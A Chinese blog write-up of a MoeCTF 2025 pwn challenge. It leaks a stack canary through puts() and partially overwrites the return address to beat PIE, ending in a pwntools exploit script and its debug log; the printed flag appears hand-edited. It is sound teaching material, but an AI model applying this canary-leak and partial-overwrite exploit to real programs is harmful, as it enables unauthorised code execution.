---
title: '西电CTF MoeCTF 2025 PWN Ezprotection'
date: '2026-09-09T20:49:28+08:00'
lastmod: '2026-09-09T20:49:28+08:00'
summary: ""
hideSummary: true
draft: false
author: "QingKong996"
categories:
  - "CTF"
tags:
  - "CTF"
  - "Pwn"
---

```
本文为人工撰写，使用生成式AI校对，AI生成部分已在其域内声明。
```

[题目链接](https://ctf.xidian.edu.cn/training/22?challenge=939)

> 注意到`PIE enabled`。

使用IDA反编译。

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  setup(argc, argv, envp);
  vuln();
  return 0;
}
```

```c
int setup()
{
  int result; // eax
  int fd; // [rsp+Ch] [rbp-4h]

  setvbuf(stdin, 0LL, 2, 0LL);
  setvbuf(stdout, 0LL, 2, 0LL);
  setvbuf(stderr, 0LL, 2, 0LL);
  result = open("/dev/urandom", 0);
  fd = result;
  if ( result != -1 )
  {
    read(result, &password, 8uLL);
    return close(fd);
  }
  return result;
}
```

```c
unsigned __int64 vuln()
{
  char buf[24]; // [rsp+0h] [rbp-20h] BYREF
  unsigned __int64 v2; // [rsp+18h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  puts("This time, I won鈥檛 let you overflow the stack so easily again.");
  puts("Here is a beautiful canary, and it will be watching over you.");
  read(0, buf, 0x2AuLL);
  puts("Go ahead and overflow, anyway I have a canary.");
  puts(buf);
  puts("I will give you a second chance, since you can not do anything anyway.");
  puts("Even if you kill the canary, you still won鈥檛 be able to overflow enough bytes.");
  read(0, buf, 0x2AuLL);
  return v2 - __readfsqword(0x28u);
}
```

> `puts()`只在读到`0x00`后停止输出，所以使`buf[]`全部非`0x00`即可泄露`v2`和`$RSP`。
>
> 注意到`vuln()`汇编:
>
> ```assembly
> .text:000000000000131B
> .text:000000000000131B ; =============== S U B R O U T I N E =======================================
> .text:000000000000131B
> .text:000000000000131B ; Attributes: bp-based frame
> .text:000000000000131B
> .text:000000000000131B ; unsigned __int64 vuln()
> .text:000000000000131B                 public vuln
> .text:000000000000131B vuln            proc near               ; CODE XREF: main+17↓p
> .text:000000000000131B
> .text:000000000000131B buf             = byte ptr -20h
> .text:000000000000131B var_8           = qword ptr -8
> .text:000000000000131B
> .text:000000000000131B ; __unwind {
> .text:000000000000131B                 endbr64
> .text:000000000000131F                 push    rbp
> .text:0000000000001320                 mov     rbp, rsp
> .text:0000000000001323                 sub     rsp, 20h
> .text:0000000000001327                 mov     rax, fs:28h
> .text:0000000000001330                 mov     [rbp+var_8], rax
> .text:0000000000001334                 xor     eax, eax
> ...
> .text:00000000000013B4                 call    _read
> .text:00000000000013B9                 nop
> .text:00000000000013BA                 mov     rax, [rbp+var_8]   <---这里
> .text:00000000000013BE                 sub     rax, fs:28h
> .text:00000000000013C7                 jz      short locret_13CE
> .text:00000000000013C9                 call    ___stack_chk_fail
> .text:00000000000013CE ; ---------------------------------------------------------------------------
> .text:00000000000013CE
> .text:00000000000013CE locret_13CE:                            ; CODE XREF: vuln+AC↑j
> .text:00000000000013CE                 leave
> .text:00000000000013CF                 retn
> .text:00000000000013CF ; } // starts at 131B
> .text:00000000000013CF vuln            endp
> .text:00000000000013CF
> .text:00000000000013D0
> ```
>
> 存在`canary`校验。
>
> 所以我们需要根据泄露的`v2`来构造栈溢出。
>
> > 在动态调试过程中，我们发现`canary`的最低为字节始终为`0x00`。
> >
> > ```c
> > memcpy(ret.bytes, dl_random, sizeof(ret));
> > 
> > #if BYTE_ORDER == LITTLE_ENDIAN
> >     ret.num &= ~(uintptr_t) 0xff;
> > #endif
> > ```
> >
> > > 以下为`AI`生成:
> > >
> > > 在常见的` inux x86-64` + `glibc `环境下，`stack canary` 是 8 字节，其中内存中的最低地址那个字节固定为 `0x00`。
> > >
> > > 这是为了对基于 C 字符串函数的溢出增加一点阻碍。例如 `strcpy`、`printf("%s")` 之类把 `\0` 当字符串结束符。canary 紧邻缓冲区时，这个 `00` 能阻止某些字符串形式的信息泄漏或覆盖。
>
> ---------------
>
> 
>
> 再次注意到`0x2a = 42 = 24 + 8 + 8 + 2`。
>
> 只能覆盖返回地址低位的两字节。
>
> 由于`PIE`随机仍然要求`0x1000`对齐，所以程序真是运行地址的低12bit和偏移的低12bit是一致的。
>
> 剩下的4bit我们可以爆破，一共16种情况。





exp:

```python
from pwn import *
import ctypes
import shutil
import logging

context(arch='amd64', os='linux', log_level='debug')
io = connect("127.0.0.1" ,34557)

io.send(b'A' * 22 + b'BCD')

io.recvuntil(b'ABC')
canary = u64(io.recvn(8)) - 0x44#D 
print(hex(canary))

io.recvuntil(b'bytes.')
io.send(b'A' * 24 + p64(canary) + b'A' * 8 + p16(0x127d))

io.interactive()
```

输出:

```
[x] Opening connection to 127.0.0.1 on port 34557
[x] Opening connection to 127.0.0.1 on port 34557: Trying 127.0.0.1
[+] Opening connection to 127.0.0.1 on port 34557: Done
[DEBUG] Sent 0x19 bytes:
    b'AAAAAAAAAAAAAAAAAAAAAABCD'
[DEBUG] Received 0x7f bytes:
    00000000  54 68 69 73  20 74 69 6d  65 2c 20 49  20 77 6f 6e  │This│ tim│e, I│ won│
    00000010  e2 80 99 74  20 6c 65 74  20 79 6f 75  20 6f 76 65  │···t│ let│ you│ ove│
    00000020  72 66 6c 6f  77 20 74 68  65 20 73 74  61 63 6b 20  │rflo│w th│e st│ack │
    00000030  73 6f 20 65  61 73 69 6c  79 20 61 67  61 69 6e 2e  │so e│asil│y ag│ain.│
    00000040  0a 48 65 72  65 20 69 73  20 61 20 62  65 61 75 74  │·Her│e is│ a b│eaut│
    00000050  69 66 75 6c  20 63 61 6e  61 72 79 2c  20 61 6e 64  │iful│ can│ary,│ and│
    00000060  20 69 74 20  77 69 6c 6c  20 62 65 20  77 61 74 63  │ it │will│ be │watc│
    00000070  68 69 6e 67  20 6f 76 65  72 20 79 6f  75 2e 0a     │hing│ ove│r yo│u.·│
    0000007f
[DEBUG] Received 0x2e bytes:
    b'Go ahead and overflow, anyway I have a canary.'
[DEBUG] Received 0xc0 bytes:
    00000000  0a 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │·AAA│AAAA│AAAA│AAAA│
    00000010  41 41 41 41  41 41 41 42  43 44 22 9b  05 70 1e 79  │AAAA│AAAB│CD"·│·p·y│
    00000020  b6 60 e2 b0  01 fc 7f 0a  49 20 77 69  6c 6c 20 67  │·`··│····│I wi│ll g│
    00000030  69 76 65 20  79 6f 75 20  61 20 73 65  63 6f 6e 64  │ive │you │a se│cond│
    00000040  20 63 68 61  6e 63 65 2c  20 73 69 6e  63 65 20 79  │ cha│nce,│ sin│ce y│
    00000050  6f 75 20 63  61 6e 20 6e  6f 74 20 64  6f 20 61 6e  │ou c│an n│ot d│o an│
    00000060  79 74 68 69  6e 67 20 61  6e 79 77 61  79 2e 0a 45  │ythi│ng a│nywa│y.·E│
    00000070  76 65 6e 20  69 66 20 79  6f 75 20 6b  69 6c 6c 20  │ven │if y│ou k│ill │
    00000080  74 68 65 20  63 61 6e 61  72 79 2c 20  79 6f 75 20  │the │cana│ry, │you │
    00000090  73 74 69 6c  6c 20 77 6f  6e e2 80 99  74 20 62 65  │stil│l wo│n···│t be│
    000000a0  20 61 62 6c  65 20 74 6f  20 6f 76 65  72 66 6c 6f  │ abl│e to│ ove│rflo│
    000000b0  77 20 65 6e  6f 75 67 68  20 62 79 74  65 73 2e 0a  │w en│ough│ byt│es.·│
    000000c0
0xb6791e70059b2200
[DEBUG] Sent 0x2a bytes:
    00000000  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
    00000010  41 41 41 41  41 41 41 41  00 22 9b 05  70 1e 79 b6  │AAAA│AAAA│·"··│p·y·│
    00000020  41 41 41 41  41 41 41 41  7d 12                     │AAAA│AAAA│}·│
    0000002a
[*] Switching to interactive mode

[DEBUG] Received 0x79 bytes:
    00000000  59 6f 75 20  66 69 6e 64  20 74 68 65  20 73 65 63  │You │find│ the│ sec│
    00000010  72 65 74 3a  0a 6d 6f 65  63 74 66 7b  4a 75 73 54  │ret:│·moe│ctf{│JusT│
    00000020  2d 53 6f 6d  65 5f 33 34  73 59 5f 50  72 6f 74 45  │-Som│e_34│sY_P│rotE│
    00000030  43 54 6c 30  6e 37 35 34  36 63 34 65  34 7d 0a 00  │CTl0│n754│6c4e│4}··│
    00000040  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
    *
    00000070  00 00 00 00  00 00 00 00  00                        │····│····│·│
    00000079
You find the secret:
moectf{THIS_IS_FLAG}
[*] Got EOF while reading in interactive
[*] Interrupted
[*] Closed connection to 127.0.0.1 port 34557

```

